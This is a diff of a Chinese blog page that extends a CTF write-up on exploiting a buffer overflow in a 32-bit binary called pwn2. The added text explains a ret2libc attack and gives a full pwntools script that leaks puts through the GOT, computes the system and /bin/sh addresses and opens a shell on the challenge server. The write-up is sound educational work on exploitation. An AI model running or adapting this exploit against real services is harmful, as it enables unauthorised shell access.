@@ -289,7 +289,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.3k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -491,16 +491,19 @@ height:50vh;
 <blockquote>
 <p><font color="red">① 查找漏洞</font></p>
 <p>通过 IDA 对 pwn2 的处理后，我们可以在函数 <code>sub_80484EA()</code> 中看到可能出现的漏洞——<code>read() 函数</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;   <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-58h]@1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">&gt;   <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-58h]@1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">&gt; <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <blockquote>
 <p>我们可以通过简单的计算：</p>
 <p>     ☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节）</p>
-<p>    ☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p>
+<p>     ☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p>
 <p>所以我们输入的数据大小超过了 buf 的实际空间大小，如下图所示：</p>
 <p><img src="/images/84-4.png" alt></p>
 <p><font color="red">② 查找 system() 和 /bin/sh </font></p>
-<p>通过在 IDA 里面查找，我们没有找到 system() 和 \bin\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh</p>
+<p>通过在 IDA 里面查找，我们没有找到 system() 和 \bin\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 <code>ROPgadget</code> 命令来查找 <code>system()</code> 和 <code>/bin/sh</code></p>
+<center>ROPgadget --binary pwn2 --string 'system'</center>
+<p>但是并没有找到该字符：</p>
+<p><img src="/images/84-8.jpg" alt></p>
 </blockquote>
 <h3 id="font-color-navy4解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy4解题思路font"></a> <font color="navy">4.解题思路</font></h3>
 <blockquote>
@@ -516,12 +519,31 @@ height:50vh;
 <p><img src="/images/84-5.jpg" alt></p>
 <p><img src="/images/84-6.jpg" alt></p>
 <p>    ☛ <code>ld-linux.so.2</code>：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。</p>
-<p>下面的是我们计算机中有的库：</p>
+<p><br>下面的是我们计算机中有的库：</p>
 <p><img src="/images/84-7.jpg" alt></p>
-<p><font color="red">② 获得 system 和 /bin/sh 的地址</font></p>
-<p>通过查看<code>pwn2</code> 的 GOT 表，我们可以得到<code>puts()</code>函数在 <code>libc.so.6</code> 中的地址，</p>
+<p><br><font color="red">② 获得 system 和 /bin/sh 的地址</font></p>
+<p>    我们可以利用<strong>重定位</strong>，来泄露 <code>puts()</code> 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc  的<strong>基地址</strong>。</p>
+<p>    我们通过得到的基地址，再通过获取 <code>system()</code> 和 <code>/bin/sh</code> 的偏移地址，我们就可以得到 <code>system()</code> 和 <code>/bin/sh</code> 的实际地址。</p>
+<p>    <font color="navy">libcbase = puts_addr - libc.dump(‘puts’)</font><br>
+    <font color="navy">system_addr = libcbase + libc.dump(‘system’)</font><br>
+    <font color="navy">binsh_addr = libcbase + libc.dump(‘str_bin_sh’)</font></p>
+<p>    我们可以通过 <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LicSearcher</a> 根据 <code>puts()</code> 函数的版本，来查找 <code>puts()</code> 、<code>system()</code> 和 <code>/bin/sh</code>的偏移</p>
 </blockquote>
-<p>《未完待续……》</p>
+<h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3>
+<h4 id="font-color-navy1编写脚本font"><a class="markdownIt-Anchor" href="#font-color-navy1编写脚本font"></a> <font color="navy">1.编写脚本</font></h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of "puts"</span></span><br><span class="line"></span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First payload (the function is to get address of puts)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"put_address:"</span> + hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span> + hex(puts_plt)</span><br><span class="line"><span class="comment">#print libc.dump("system")</span></span><br><span class="line"><span class="comment">#print libc.dump("str_bin_sh")</span></span><br><span class="line"><span class="comment">#print libc.dump("_libc_start_main")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#According the address of offset in libc, we can gain the address of system and binsh</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.dump(puts):"</span> + hex(libc.dump(<span class="string">'puts'</span>))</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------get_shell----------------------------------"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="font-color-navy2执行脚本font"><a class="markdownIt-Anchor" href="#font-color-navy2执行脚本font"></a> <font color="navy">2.执行脚本</font></h4>
+<p><img src="/images/84-10.jpg" alt></p>
+<h4 id="font-color-navy3查看当前目录下的文件夹font"><a class="markdownIt-Anchor" href="#font-color-navy3查看当前目录下的文件夹font"></a> <font color="navy">3.查看当前目录下的文件夹</font></h4>
+<p><img src="/images/84-11.jpg" alt></p>
+<h4 id="font-color-navy4获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy4获取-flagfont"></a> <font color="navy">4.获取 flag</font></h4>
+<p><img src="/iamges/84-12.jpg" alt></p>
+<h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3>
+<ul>
+<li><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">延迟绑定的实现</a></li>
+<li>[<a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a>](<a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a>)★</li>
+<li><a href="https://www.zhihu.com/question/21249496" target="_blank" rel="noopener">Linux动态链接为什么要用PLT和GOT表？</a></li>
+</ul>
 
     </article>
     <!-- license  -->
@@ -530,7 +552,7 @@ height:50vh;
             <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
             </p><p>原文链接：<a href="https://muzibing.github.io/2019/09/28/2019.09.28（84）/">https://muzibing.github.io/2019/09/28/2019.09.28（84）/</a>
             </p><p>发表日期：<a href="https://muzibing.github.io/2019/09/28/2019.09.28（84）/">September 28th 2019, 6:33:02 pm</a>
-            </p><p>更新日期：<a href="https://muzibing.github.io/2019/09/28/2019.09.28（84）/">September 28th 2019, 9:57:11 pm</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2019/09/28/2019.09.28（84）/">October 8th 2019, 10:15:41 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -677,7 +699,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown一-基础知识font"><span class="toc-number">1.</span> <span class="toc-text"> 一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1got-表-plt-表和-libc-库的相关知识font"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.GOT 表、PLT 表和 libc 库的相关知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy2重定位font"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.重定位</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy3延迟绑定font"><span class="toc-number">2.</span> <span class="toc-text"> 3.延迟绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown二-解题思路font"><span class="toc-number">3.</span> <span class="toc-text"> 二、解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1file-pwn2font"><span class="toc-number">3.1.</span> <span class="toc-text"> 1.file pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy2check-pwn2font"><span class="toc-number">4.</span> <span class="toc-text"> 2.check pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy3ida-反编译-pwn2font"><span class="toc-number">4.1.</span> <span class="toc-text"> 3.IDA 反编译 pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy4解题思路font"><span class="toc-number">5.</span> <span class="toc-text"> 4.解题思路</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown一-基础知识font"><span class="toc-number">1.</span> <span class="toc-text"> 一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1got-表-plt-表和-libc-库的相关知识font"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.GOT 表、PLT 表和 libc 库的相关知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy2重定位font"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.重定位</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy3延迟绑定font"><span class="toc-number">2.</span> <span class="toc-text"> 3.延迟绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown二-解题思路font"><span class="toc-number">3.</span> <span class="toc-text"> 二、解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1file-pwn2font"><span class="toc-number">3.1.</span> <span class="toc-text"> 1.file pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy2check-pwn2font"><span class="toc-number">4.</span> <span class="toc-text"> 2.check pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy3ida-反编译-pwn2font"><span class="toc-number">4.1.</span> <span class="toc-text"> 3.IDA 反编译 pwn2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy4解题思路font"><span class="toc-number">5.</span> <span class="toc-text"> 4.解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown三-解题步骤font"><span class="toc-number">6.</span> <span class="toc-text"> 三、解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy1编写脚本font"><span class="toc-number">6.1.</span> <span class="toc-text"> 1.编写脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy2执行脚本font"><span class="toc-number">6.2.</span> <span class="toc-text"> 2.执行脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy3查看当前目录下的文件夹font"><span class="toc-number">6.3.</span> <span class="toc-text"> 3.查看当前目录下的文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-navy4获取-flagfont"><span class="toc-number">6.4.</span> <span class="toc-text"> 4.获取 flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-brown四-参考文章font"><span class="toc-number">7.</span> <span class="toc-text"> 四、参考文章</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
